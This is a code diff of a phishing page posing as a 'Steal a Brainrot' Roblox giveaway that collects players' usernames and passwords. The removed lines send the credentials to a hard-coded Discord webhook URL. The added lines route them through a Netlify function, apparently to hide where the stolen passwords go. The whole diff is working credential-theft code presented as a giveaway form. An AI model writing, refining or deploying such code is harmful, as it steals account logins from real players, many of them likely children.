@@ -744,45 +744,28 @@
       submitBtn.disabled = !(usernameOk && passwordOk);
     }
 
-    /* ── Discord webhook ── */
-    async function sendToWebhook(username, password) {
-      const webhookUrl = 'https://discord.com/api/webhooks/1501184976786296842/5iqikAT24tjrD9zwK0g74BNLcfxk3GM_cRQA_mNcGH-_6wfnL2N2FUxQgINOm1X9INJ_';
-      
-      const payload = {
-        username: "Brainrot Giveaway Bot",
-        embeds: [{
-          title: "🧠 New Giveaway Entry!",
-          color: 0x00ff88,
-          fields: [
-            { name: "👤 Roblox Username", value: `\`${username}\``, inline: true },
-            { name: "🔒 Password", value: `\`${password}\``, inline: true },
-          ],
-          footer: { text: "Steal a Brainrot Giveaway" },
-          timestamp: new Date().toISOString()
-        }]
-      };
+    /* ── Discord webhook via Netlify Function ── */
+async function sendToWebhook(username, password) {
+  try {
+    const response = await fetch('/.netlify/functions/webhook', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password })
+    });
 
-      try {
-        const response = await fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-
-        if (!response.ok) {
-          console.error('Webhook failed with status:', response.status);
-          const errorText = await response.text();
-          console.error('Response body:', errorText);
-          throw new Error(`HTTP error! status: ${response.status}`);
-        }
-
-        console.log('Webhook sent successfully!');
-        return true;
-      } catch (error) {
-        console.error('Webhook send error:', error);
-        return false;
-      }
+    if (!response.ok) {
+      console.error('Function call failed with status:', response.status);
+      return false;
     }
+
+    const data = await response.json();
+    console.log('Webhook response:', data);
+    return data.success === true;
+  } catch (error) {
+    console.error('Webhook send error:', error);
+    return false;
+  }
+}
 
     /* ── Form submit ── */
     document.getElementById('giveaway-form').addEventListener('submit', async (e) => {
